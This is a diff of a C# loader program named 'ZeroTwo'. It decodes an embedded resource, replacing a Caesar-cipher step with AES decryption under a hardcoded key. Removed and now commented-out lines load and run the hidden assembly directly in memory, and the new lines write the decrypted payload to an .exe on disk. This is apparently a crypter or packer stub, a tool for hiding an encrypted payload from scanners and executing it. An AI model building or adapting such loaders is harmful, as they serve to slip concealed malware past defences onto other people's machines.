@@ -1,33 +1,16 @@
 ﻿using System;
 using System.IO;
 using System.Reflection;
-using System.Threading;
+using System.Security.Cryptography;
+using System.Text;
 
 namespace ZeroTwo.src {
     class _02 {
+        private static byte[] k = Encoding.ASCII.GetBytes("0202020202020202");
+        private static byte[] s = Encoding.ASCII.GetBytes("0202020202020202");
+
         public static void Main(string[] args) {
             Unp();
-        }
-
-        public static char cipher(char ch, int key) {
-            if (!char.IsLetter(ch)) {
-                return ch;
-            }
-            char d = char.IsUpper(ch) ? 'A' : 'a';
-            return (char)((((ch + key) - d) % 26) + d);
-        }
-
-        private static string Encipher(string input, int key) {
-            string output = string.Empty;
-
-            foreach (char ch in input)
-                output += cipher(ch, key);
-
-            return output;
-        }
-
-        private static string Decipher(string input, int key) {
-            return Encipher(input, 26 - key);
         }
 
         private static void Unp() {
@@ -36,11 +19,35 @@ namespace ZeroTwo.src {
             using (Stream stream = assembly.GetManifestResourceStream(res)) {
                 using (StreamReader reader = new StreamReader(stream)) {
                     string core = reader.ReadToEnd();
-                    Byte[] bytes = Convert.FromBase64String(Decipher(core, 5));
-                    var loaded = Assembly.Load(bytes);
-                    var entryPoint = loaded.EntryPoint;
-                    var commandArgs = new string[0];
-                    var returnValue = entryPoint.Invoke(null, new object[] { commandArgs });
+                    byte[] bytes = Convert.FromBase64String(core);
+                    Stream bytesStream = new MemoryStream(bytes);
+
+                    RijndaelManaged AES = new RijndaelManaged();
+                    AES.KeySize = 256;
+                    AES.BlockSize = 128;
+
+                    var key = new Rfc2898DeriveBytes(k, s, 1000);
+                    AES.Key = key.GetBytes(AES.KeySize / 8);
+                    AES.IV = key.GetBytes(AES.BlockSize / 8);
+                    AES.Padding = PaddingMode.Zeros;
+                    AES.Mode = CipherMode.CBC;
+
+                    CryptoStream cs = new CryptoStream(bytesStream, AES.CreateDecryptor(), CryptoStreamMode.Read);
+                    FileStream fs = new FileStream("C:\\Users\\jonat\\Desktop\\ZeroTwo.exe", FileMode.Create);
+
+                    int data;
+                    while ((data = cs.ReadByte()) != -1)
+                        fs.WriteByte((byte)data);
+
+                    fs.Close();
+                    cs.Close();
+
+                    //File.Delete(inputFile);
+
+                    //var loaded = Assembly.Load(result);
+                    //var entryPoint = loaded.EntryPoint;
+                    //var commandArgs = new string[0];
+                    //var returnValue = entryPoint.Invoke(null, new object[] { commandArgs });
                 }
             }
         }
